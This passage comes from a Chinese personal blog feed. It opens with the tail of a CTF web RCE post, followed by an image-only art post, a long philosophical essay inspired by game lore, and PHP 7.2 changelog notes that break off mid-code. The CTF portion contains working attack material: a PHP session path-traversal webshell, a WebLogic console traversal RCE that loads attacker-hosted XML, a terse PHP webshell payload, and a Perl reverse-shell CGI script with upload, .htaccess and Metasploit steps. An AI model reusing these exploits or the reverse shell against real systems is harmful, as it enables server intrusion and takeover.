PHPSESSID&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;public&#x2F;111111112.php</li><li>Upgrade-Insecure-Requests: 1</li><li>接着访问<code>http://IP:PORT/public/111111112.php?1=system(%22cat%20/flag%22);</code></li></ul><h3 id="WebLogic-服务器的漏洞利用"><a href="#WebLogic-服务器的漏洞利用" class="headerlink" title="WebLogic 服务器的漏洞利用"></a>WebLogic 服务器的漏洞利用</h3><ul><li>WebLogic控制台必须对外暴露，并且可以通过 <a href="http://IP:PORT/console">http://IP:PORT/console</a> 访问</li><li>10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3WebLogic服务器使用了受影响的Spring Framework组件，该组件的 FileSystemXmlApplicationContext 允许通过URL加载远程的XML配置文件。如果目标服务器未使用或已修复相关漏洞，该攻击将失效。攻击者能控制远程文件</li><li>访问<code>http://IP:PORT/console</code>到登录页面</li><li>接着访问<code>http://IP:PORT/console/css/%252e%252e%252fconsole.portal</code>（这里最好抓包修改）</li><li>接着在本地用python起一个HTTP服务，HTTP下放置weblogic.xml</li><li><pre><code class="python">python3 -m http.server 8001        接着访问`http://IP:PORT/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://ip:8001/weblogic.xml&quot;)`      短rce？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？          形如`$&#123;_GET&#125;&#123;%f8&#125;();&amp;%f8=cmd`的payload需要的代码量最少且功能齐全，</code></pre></li></ul><p>使用Metasploit Framework来检测和利用CGI漏洞的过程可以分为以下几个步骤。我们将详细解释如何完成每一步，包括如何确保环境准备好、如何创建和执行脚本。</p><h3 id="1-环境检查"><a href="#1-环境检查" class="headerlink" title="1. 环境检查"></a>1. 环境检查</h3><p>在尝试利用CGI漏洞之前，你需要确保目标服务器符合以下条件：</p><ul><li><strong>服务器允许执行CGI脚本</strong>：CGI脚本通常放在服务器的<code>/cgi-bin/</code>目录下，你需要确保目标服务器允许执行该目录下的脚本。</li><li><strong>当前目录可写</strong>：你需要在目标服务器上有写权限，以便上传或创建恶意CGI脚本。</li><li><strong>.htaccess文件有效</strong>：<code>.htaccess</code>文件用于控制Apache服务器的配置，确保该文件可以在目标服务器上正常使用。这个文件可以用来覆盖服务器默认配置，例如，允许执行某个目录中的CGI脚本。</li></ul><h3 id="2-创建恶意CGI脚本"><a href="#2-创建恶意CGI脚本" class="headerlink" title="2. 创建恶意CGI脚本"></a>2. 创建恶意CGI脚本</h3><p>接下来，你需要创建一个恶意CGI脚本，该脚本会连接到攻击者的机器，并提供一个反向Shell（reverse shell）。这是利用CGI漏洞的关键步骤。</p><p>假设你使用Perl编写这个恶意CGI脚本，代码如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><span class="hljs-keyword">use</span> Socket;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&quot;攻击者的IP&quot;</span>;  <span class="hljs-comment"># 攻击者的IP地址</span><br><span class="hljs-variable">$port</span> = 攻击者监听的端口;  <span class="hljs-comment"># 攻击者监听的端口号</span><br><span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&quot;tcp&quot;</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">connect</span>(S,sockaddr_in(<span class="hljs-variable">$port</span>,inet_aton(<span class="hljs-variable">$ip</span>))))&#123;<br>  <span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>); <span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>); <span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<br>  <span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将攻击者的IP地址和端口号替换为你实际的IP地址和端口号，然后将这个脚本保存为<code>malicious.cgi</code>。</p><h3 id="3-上传脚本并修改-htaccess"><a href="#3-上传脚本并修改-htaccess" class="headerlink" title="3. 上传脚本并修改.htaccess"></a>3. 上传脚本并修改.htaccess</h3><p>上传你的<code>malicious.cgi</code>到目标服务器的CGI目录中，比如<code>/cgi-bin/</code>。如果你没有直接上传的权限，可以尝试通过其他漏洞上传。</p><p>接下来，创建或修改<code>.htaccess</code>文件，使得<code>malicious.cgi</code>可以执行：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Options</span> +ExecCGI<br><span class="hljs-attribute">AddHandler</span> cgi-script .cgi<br></code></pre></td></tr></table></figure><p>确保这个<code>.htaccess</code>文件与<code>malicious.cgi</code>位于同一目录下。</p><h3 id="4-执行脚本"><a href="#4-执行脚本" class="headerlink" title="4. 执行脚本"></a>4. 执行脚本</h3><p>通过Web浏览器访问上传的<code>malicious.cgi</code>脚本，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>target-server.com<span class="hljs-regexp">/cgi-bin/m</span>alicious.cgi<br></code></pre></td></tr></table></figure><p>一旦访问成功，恶意CGI脚本会在目标服务器上执行，并且通过指定的IP和端口与攻击者的机器建立反向连接。攻击者就可以通过这个连接获得目标服务器的Shell访问权限。</p><h3 id="5-使用Metasploit"><a href="#5-使用Metasploit" class="headerlink" title="5. 使用Metasploit"></a>5. 使用Metasploit</h3><p>Metasploit也提供了多种模块来检测和利用CGI漏洞。常见的步骤包括：</p><ul><li><p><strong>启动Metasploit Console</strong>：在终端中运行<code>msfconsole</code>启动Metasploit。</p></li><li><p><strong>选择合适的模块</strong>：例如，可以使用<code>use exploit/unix/webapp/web_delivery</code>模块，结合特定的Payload来生成并利用恶意CGI脚本。</p></li><li><p><strong>配置模块选项</strong>：设置目标URL、Payload类型（如Perl、Python等），以及攻击者的IP和端口。</p></li><li><p><strong>运行攻击</strong>：执行<code>exploit</code>命令，Metasploit会自动发送恶意请求，尝试利用CGI漏洞。</p></li></ul><h3 id="6-建立连接和后续操作"><a href="#6-建立连接和后续操作" class="headerlink" title="6. 建立连接和后续操作"></a>6. 建立连接和后续操作</h3><p>如果成功，Metasploit会给你一个交互式的Shell，接下来你可以继续通过这个Shell执行进一步的攻击，例如提权、横向移动等。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>法律和道德</strong>：请确保在合法和道德范围内操作。未经授权的入侵或攻击是非法的。</li><li><strong>环境的多样性</strong>：不同的服务器环境配置可能有所不同，确保你了解目标服务器的具体配置。</li></ul><p>通过以上步骤，你可以利用Metasploit Framework和CGI漏洞获得目标服务器的控制权。然而，在实际操作中，务必要小心并确保遵守相关法律法规。</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>艺术</title>
    <link href="/2024/08/31/%E8%89%BA%E6%9C%AF/"/>
    <url>/2024/08/31/%E8%89%BA%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/d3f796e9470a7a815944cbb4190e96d.jpg"></p><p><img src="/../img/995c89fe9d2e20baee99d09a75088d5.jpg"></p><p><img src="/../img/e297518df4ce056d19e0be589fe967d.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>艺术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>自己的艺术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的革命</title>
    <link href="/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/"/>
    <url>/2024/08/31/%E6%88%91%E7%9A%84%E9%9D%A9%E5%91%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="「虛无」"><a href="#「虛无」" class="headerlink" title="「虛无」"></a>「虛无」</h2><img src="F:\new myblog\STUDY\source\img\112dea9d2797ae224a01a3fe02821bc.jpg" style="zoom: 50%;" /><p>或与之对抗、或听天由命，人们总会找到答案</p><p>「人们沉睡，是为了最终从梦中醒来」一一这就是一位垂垂老矣的无名客穷尽一生得出的解答。</p><p>每个人都会有迷路的时候，犹豫不决，不知道该去往哪个方向。它存在于这片梦境中，也存在于梦境之外的任何地方。走向属于自己的前方，找到独属于身己的意义，并在生命的最后体面的迎接虚无的降临</p><p>我们有行动的权利，我们有定义自己结局的权利，我们有前进的权利，走在结局的路上，人能做的事有很多，而结局也会因此展现截然不同的意义</p><p>永远幸福的梦境会以何种方式实现：</p><p>有人渴望钱财，便拿走他的欲望，有人犯罪，便拿走他的坏念头，有人病痛缠身，便拿走他的烦恼早有人沉迷游戏，便拿走他的快乐。没有人能互相伤害，没有人会经历离别。</p><p>没有质疑，没有思考，没有自由，这里没有背叛，因为所有人都忠诚于唯一，这里没有过去也没有未来，只有永远幸福快乐的现在，停留在当下的快乐，代价即为未来的景色</p><p>哪怕你是为他好，这梦也真的比现实更好也是一样，那种冲动无关理智，甚至也无关利益，那就是“我愿意”是的你是对我好，但我就是不乐意</p><p>我不愿被任何人支配，那些“神”“主”“天”啊，你并不相信人类，却需要所有的人类相信他，你以「秩序」为天地万物万民定义——却令我等晓得自己不过是你的傀儡！表面上是在追求所谓的永恒正确，实质是妄图用一种答案一了百了的解决一切，作为人类的我相信所有人，于是那些被相信的人就可以选择去相信</p><p>捷径，永远是有代价的，要实现那让所有人幸福的宏伟目标，只能是一步一步，在所有前人的帮助下踏踏实实走向未来，然后一拳一拳，将所有拦在面前的困难堂堂正正的打趴下，周天万物，唯易不易，所以要永远前进，永远开拓，永远革故鼎新，总得有人从梦中醒来，去改变这个让人想要去做梦的世界，但人就是如此狂妄愚昧不知好歹不可理喻的生物，他们心中的原初之火根本无法熄灭，那是从树上走向广阔的大地时就充盈胸膛的本能，于是他们一定要在天堂中渴望未知与意义，于是他们将体会失去与死亡，体会一切可怖之物，故而理解何谓后悔，错误，何谓真正的爱与相信，他们想要作为一个“愚者”，去选择看上去“错误”的道路，仅仅是为了获得能够“试试”，能够去选择犯错的权利，人是低劣又向往崇高，满是缺陷又期待完美的生物，所以人坚信能用自己的智慧走出自己的道路。不愿居住在神赐的永恒幸福之伊甸，所以人终究会选择前往名为自由的地狱，然后在地狱中渴望天堂的光明，而正是这自由带来的无限可能之未来，方令所有心智不至于陷入无意义的绝望，事物的好坏永远都是一体两面，强者可以开拓远方，守望弱者，指引方向，纠正宏观的错误，弱者被允许落后，允许原地休息，但也不会被抛弃——苦难与阳光</p><img src="F:\new myblog\STUDY\source\img\560px-秩序星神_太一.webp" style="zoom: 67%;" /><p>「自黄昏战争以降天穹空虚，大地混沌。为教天地万物归于可知，『秩序』太一降生。这便是头一日。」<br>「祂采星云作成羽拔，造了有黑白键的大琴。击打白键，太阳升起，击打黑键，月亮升起。昼夜就这样成了。这便是第二日。」<br>「祂撷星流制成笔尖，拟了发音和计数的符号。祂使星尘汇成河流，指认那善与义的在上游，那恶与不义的在下游。万物自此蒙受各自的记号，世人自此得以知晓善恶与利害。这便是第三日与第四日」<br>「祂拾星环陈明法度，同人群立了行事的典章。以有黑白键的大琴为乐器；以发音和计数的符号为音符；以有下行无上行的河流作旋律；以陈明法度的典章定曲式。世人遂在乐章中找准唯一的位置，这便是第五日与第六日。」<br>「祂赐了世间众人『意义』，天地万物都造齐了。祂歇了一切创造的工。然而，众生复向太一呼告：『你以「秩序」为万民定义，却令我等晓得自己不过是你的傀儡！故在那日，万众集结一心，将神投入毁灭坑中。这便是第七日。」<br>「欢呼颂唱遂济声响起—一」</p><p>普世同谐，群星共熠，无上功德颂神主—-秩序已死！秩序已死！秩序已死！<br>伤哉！有大伟力的星神，你以「轶序」为天地万物万民定义——却令我等晓得自己不过是你的傀儡！<br>誓以士万七千三百三十六枚音符，通告尔等，加入光菜的合唱—归于天堂！<br>如果梦境与现实无异，它还能被称作虚假么？<br>我以完美无缺的乐章号念，一再创乐园<br>已死的星神，我向你致敬。<br>以此七日誓言，命尔听从号令<br>并非是你造化万物，而是人再造了你，以尔神躯，为我等乐园奠基！<br>生命因何而沉睡？因为..总有一天…..我们会从梦中醒来。</p><p>《囚人颂》<br> 恶图徒蒙召受判—-群魔慑服，涌入猛火，叩首哀求，克日垂顾！<br>“希望你能喜欢这片焦土之上的…[美梦之地]。请继续向前走吧，旅者。在旅途的尽头，我有事想请求你们的协助。”<br>「琥珀历2147纪，囚犯哈努努掀起了声势浩大的战火，并获得胜利。公司称其为『边陲战争』，而阿斯德纳人称其为『独立战争』]<br>“囚笼被粉碎了，狱卒被驱逐了！”<br>「哈努努先生是一位伟人。但我们不应讳言，他能够带给囚徒自由，却不知晓如何给予他们真正的自由。」<br>“可敬的旅人，感谢你们留下，可你也无法驱逐那些狱卒，即便他们早已不在阿斯德纳”<br>「三位无名客留在此地，试图向边睡监狱传递『开拓』的教益，但可情，无济于事。」<br>“我们应当再造一个囚笼，不在这世上，而在人心中，只要我们不使他们自由，便永远不会流离失所”<br>「阿斯德纳再度被战火席卷，这次的敌人来自内部。囚徒至死仍是囚徒，只知为自由而战，不知为自由而生。」<br>「希望你喜欢这片焦土之上的—一自由之地。」<br>看吧，他们的刑期早已结束，公司的狱卒也已被驱逐。可这些囚犯仍是奴隶之身，因为囚禁他们的不是外物，而是内心。<br>自由存在于任何地方，唯独不存在于软弱的灵魂。它襄助不了任何人，只能襄助信它存在的人。<br>「囚徒们啊！我命令你们学会自由，并教会你们的兄弟—一为生而战！」<br>「已经不再有人能阻断你们的道路，你们自由了。」至此便是第一幕。盛燃的战火中，『边陲监狱』逐渐走向『流放之地』</p><p>《愚仆颂》<br>义人如羊走迷————义人不稳，迷误歧途，望尔使予，归复牧群！<br>「流放之地的秩序十分混乱，又有内忧外患虎视眈眈。七大家系表面统一，实则各自为政，纷争不断。」<br>“七位仆人都认为自己能取代旧日的主人”<br>「最先退出内战的是黑布林家系，在苜蓿草家系策划的『白色沙漠』事件中，他们永远成为了历史。」<br>“会计，你我是宅邸的基柱，曾经盟誓团结一致永不背弃，你….你为何要杀我”<br>“因为主人用泥土造化了你，用烈火造化了我，我比你更高贵！”<br>「苜蓿草的家主意图投靠公司，用自由换取生存，却被长子大义灭亲，而后者接任了家主之席。」<br>“孩子，你不曾为旧主效命而不清楚他的威能，他能夺走我们自由，便也能赐予我们自由”<br>「银河残酷而无情，灯蛾家系试图开垦列车留下的银轨，却遭遇虫群余孽，惨遭覆灭。」<br>“与蜂共舞者，必遭蜂毒害，我早已知晓我的命运，这一天早晚会到来”<br>「直到歌斐木带领家族来到流放之地，五大家系先后皈依，匹诺康尼才得以拥抱它的新名—梦想之地。」<br>“而我将成为诸位新的家人，并将你们从死去的幻影中解放”<br>「外来的宾客，我请求你帮助这间宅子，摆脫潜藏的教唆者的毒害。我希望他们都能恢复理智的镇静，不再受到虚妄的操控」<br>“若主人不再归来，我便是自由的。但若没有主人的指引，我又该为谁歌唱？”“我应为我的新主歌唱，正如祂高贵的声音，也曾为银河而响”<br>“主人！您终将归来！而我将永远守望，直到您因我的忠诚而嘉奖于我”“主人，您已不在，我便不再等待您的嘉奖.所有一切应属我的，我当自取”<br>“我曾是所有仆人中最忠诚的卫士！主人遭驱逐后，我自当代他执掌万民的权柄！”“过去的主人早已不在，我为何仍在畏惧众人构造的残影？”<br>“主人已不在，我本当自由，可没有主人的号令，我只得问道于盲”“主人已不在，我便不再有自己的主人。我应寻找新的主人，并为之效忠！”<br>“我要么是自己的主人，要么去迎回旧主，断然没有服从于新主的道理”“若是没有主人，又有谁还能赐我自由呢？”<br>「同谐，改变了匹诺康尼，但做法都与过去的狱卒无异。」<br>「感谢你们，外来的宾客！现在仆人都取回了自己的理性。」<br>「众人啊！你们的旧主不会再归来，唯有因正道而互助，以真理相勉者，方能在彼此中收获完满战胜虚伪的幻影—一拥入彼此的怀抱吧！」<br>听，整个阿斯德纳都在下雪！天空摇摇欲坠，大地积重难返。银色宇宙的尽头—一朝阳冒出了初生的芽！可惜直到最后，他们仍是一群被赋予了自由权的奴隶「至此便是第二幕。虛幻的谐乐中，“流放之地』逐渐走向『盛会之星』。」</p><p> 《秩序颂》<br> 生灵永恒安息—-祈望太一，赦众夙犯，生灵善恶，息止安所！<br>“如若没有一位君王，又有谁为万民负责？”<br> 「若万民没有远视的双眼，我们便应做出他们的选择，并为之负责。」<br>“如若没有一位君王，谁庇护孱弱者？谁对抗横暴者？”<br>「我们必当为庇护孱弱者而互助，正如我们必当为对抗横暴者而互助。」<br>“如若没有一位君王，谁能使星辰流转？潮汐涨落，万物生长？”<br>「在君主出现之前，它们各行其是；在君主离开后，他们依旧各行其是」<br>“可送别君王后，谁来做新的君王呢？”<br>「我们不再需要一位君王。我们本是超绝万物的君王。」<br>「恭送您离开，旧日的君王。」<br>「我从无限延伸的螺旋阶梯，向着未来缓缓坠落。不必恒久地记住我，或试图将我寻获。我心中的轮廓，必将与其他经验交错」<br>「我留下难以察觉的痕迹，在一个静夜中走过。不必恒久地记住我，或追念梦的魂魄。」<br>「属于我的必将衰落，而你会超越它的孱弱。」</p><h2 id="预告信"><a href="#预告信" class="headerlink" title="预告信"></a>预告信</h2><p>我们收到了来自同僚的邀约，在邀约的尽头有着压迫与黑暗，以及一位同僚拼尽生命都未完成的信念，我们将义无反顾的为他完成，哪怕是以我们的生命为代价，也在所不辞！因为这份邀约的尽头终有一位同僚会将那里的压迫解放，使永夜迎来黎明，是时候让全世界的懦夫，蛀虫，压迫者想起共产主义的名字了！</p><p>“那是传奇陨落之地，你懂不懂什么是传奇啊？你去除了送死还能做什么！”“那里的路还需要游侠去走完……一群理想主义者，为对抗压迫与剥削而存在，为人类追寻真正的自由与平等”“那是你能掺合的事吗？你除了凑人头当炮灰还有啥用？！你死了，那些在乎你的人、你所在乎的人，怎么办”“……（沉默），我是巡海游侠，我们都是巡海游侠，希望我们还会再见。”</p><p>这些“巡海”游侠都是能在星球间穿梭的猛人，不要只看人家强，多想想人家为什么强。然后，该戒手冲戒手冲、该学习学习、自己找方法变强，才是真正的巡猎命途。</p><p>在接下来的长夜里，你恐怕会遭遇许多挫折，见证众多悲剧，最后，目中所见只余黑白二色。<br>但请相信，在那黑白的世界中会有一点红色稍纵即逝，但在你做出抉择之时——它必将再度示现。<br>而你，要仔细咀嚼其意义，然后回到清醒的世界去。我们都将在那里找到答案。</p><p>![](F:\new myblog\STUDY\source\img\1684809194900.jpg)</p><p>帝弓仅以光矢宣其纶音 帝光超车所向捷  若他不回头，那祂的刀必磨快，弓必上弦，使恶人施加的毒害临到自己头上。</p>]]></content>
    
    
    <categories>
      
      <category>革命拂晓</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文字感悟</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP7.2特性</title>
    <link href="/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/"/>
    <url>/2024/08/31/PHP7-2%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP7-2函数相关变更"><a href="#PHP7-2函数相关变更" class="headerlink" title="PHP7.2函数相关变更"></a>PHP7.2函数相关变更</h1><h2 id="（废弃）-autoload-方法"><a href="#（废弃）-autoload-方法" class="headerlink" title="（废弃）__autoload() 方法"></a>（废弃）__autoload() 方法</h2><p><code>__autoload()</code> 方法已被废弃， 因为和 <code>spl_autoload_register()</code> 相比功能较差 (因为无法链式处理多个 autoloader)， 而且也无法在两种 autoloading 样式中配合使用。</p><h2 id="（废弃）create-function-函数"><a href="#（废弃）create-function-函数" class="headerlink" title="（废弃）create_function() 函数"></a>（废弃）create_function() 函数</h2><p>考虑到此函数的安全隐患问题（它是 <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a> 的瘦包装器），该过时的函数现在已被废弃。 更好的选择是<a href="https://www.php.net/manual/zh/functions.anonymous.php">匿名函数</a>。</p><h2 id="（废弃）parse-str-不加第二个参数"><a href="#（废弃）parse-str-不加第二个参数" class="headerlink" title="（废弃）parse_str() 不加第二个参数"></a>（废弃）parse_str() 不加第二个参数</h2><p>使用 <code>parse_str()</code> 时，不加第二个参数会导致查询字符串参数导入当前符号表。 考虑到安全隐患问题，不加第二个参数使用 <code>parse_str()</code> 的行为已被废弃。 此函数的第二个选项为必填项，它使查询字符串转为 Array。</p><h2 id="（废弃）assert-一个字符串参数"><a href="#（废弃）assert-一个字符串参数" class="headerlink" title="（废弃）assert() 一个字符串参数"></a>（废弃）assert() 一个字符串参数</h2><p><code>assert()</code> 字符串参数将要求它能被 <code>eval()</code> 执行。 考虑到可能被执行远程代码，废弃了字符串的 <a href="https://www.php.net/manual/zh/function.assert.php">assert()</a>，最好提供 bool 的表达式。</p><h2 id="（移除）-utf8-encode-和-utf8-decode-¶"><a href="#（移除）-utf8-encode-和-utf8-decode-¶" class="headerlink" title="（移除） utf8_encode() 和 utf8_decode() ¶"></a>（移除） <a href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> 和 <a href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a><a href="https://www.php.net/manual/zh/migration72.other-changes.php#migration72.other-changes.utf8_-functions-to-ext-standard"> ¶</a></h2><p><a href="https://www.php.net/manual/zh/function.utf8-encode.php">utf8_encode()</a> 和 <a href="https://www.php.net/manual/zh/function.utf8-decode.php">utf8_decode()</a> 现在已经作为字符串处理函数移到标准扩展中， 在此之前需要启用 <a href="https://www.php.net/manual/zh/book.xml.php">XML</a> 扩展才能使用。</p><h1 id="PHP7-2语法相关变更"><a href="#PHP7-2语法相关变更" class="headerlink" title="PHP7.2语法相关变更"></a>PHP7.2语法相关变更</h1><h2 id="（增加）允许重写抽象方法"><a href="#（增加）允许重写抽象方法" class="headerlink" title="（增加）允许重写抽象方法"></a>（增加）允许重写抽象方法</h2><p>当一个抽象类继承于另外一个抽象类的时候，继承后的抽象类可以重写被继承的抽象类的抽象方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>)</span>;<br>&#125;<br><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// overridden - still maintaining contravariance for parameters and covariance for return</span><br>    <span class="hljs-keyword">abstract</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) : <span class="hljs-title">int</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="（增加）允许分组命名空间的尾部逗号"><a href="#（增加）允许分组命名空间的尾部逗号" class="headerlink" title="（增加）允许分组命名空间的尾部逗号"></a>（增加）允许分组命名空间的尾部逗号</h2><p>命名空间可以在PHP 7中使用尾随逗号进行分组引入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Foo</span>\<span class="hljs-title">Bar</span>\&#123;<br>    <span class="hljs-title">Foo</span>,<br>    <span class="hljs-title">Bar</span>,<br>    <span class="hljs-title">Baz</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="（增加）转化数字键"><a href="#（增加）转化数字键" class="headerlink" title="（增加）转化数字键"></a>（增加）转化数字键</h2><p>转化数组为对象类型时，如果数组存在数字键，现在可以访问了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// array to object</span><br><span class="hljs-variable">$arr</span> = [<span class="hljs-number">0</span> =&gt; <span class="hljs-number">1</span>];<br><span class="hljs-variable">$obj</span> = (<span class="hljs-keyword">object</span>)<span class="hljs-variable">$arr</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<br>    <span class="hljs-variable">$obj</span>,<br>    <span class="hljs-variable">$obj</span>-&gt;&#123;<span class="hljs-string">&#x27;0&#x27;</span>&#125;, // now accessible<br>    <span class="hljs-variable">$obj</span>-&gt;&#123;<span class="hljs-number">0</span>&#125; // now accessible<br>);<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">PHP&lt;7.2</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [0]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">NULL</span><br><span class="hljs-comment">NULL</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PHP7.2</span><br><span class="hljs-comment">object(stdClass)#1 (1) &#123;</span><br><span class="hljs-comment">  [&quot;0&quot;]=&gt;</span><br><span class="hljs-comment">  int(1)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">int(1)</span><br><span class="hljs-comment">int(1)</span><br></code></pre></td></tr></table></figure><p>对象转为数组也同样可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// object to array</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-number">0</span>&#125; = <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br><span class="hljs-variable">$arr</span> = (<span class="hljs-keyword">array</span>)<span class="hljs-variable">$obj</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<br>    <span class="hljs-variable">$arr</span>,<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>], // now accessible<br>    <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;0&#x27;</span>] // now accessible<br>);<br></code></pre></td></tr></table></figure><h2 id="（废弃）不带引号的字符串"><a href="#（废弃）不带引号的字符串" class="headerlink" title="（废弃）不带引号的字符串"></a>（废弃）不带引号的字符串</h2><p>不带引号的字符串是不存在的全局常量，转化成他们自身的字符串。 在以前，该行为会产生 <strong>E_NOTICE</strong>，但现在会产生 <strong>E_WARNING</strong>。在下一个 PHP 主版本中，将抛出 <strong>Error</strong> 异常。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(NONEXISTENT);<br><br><span class="hljs-comment">/* Output:</span><br><span class="hljs-comment">Warning: Use of undefined constant NONEXISTENT - assumed &#x27;NONEXISTENT&#x27; (this will throw an Error in a future version of PHP) in %s on line %d</span><br><span class="hljs-comment">string(11) 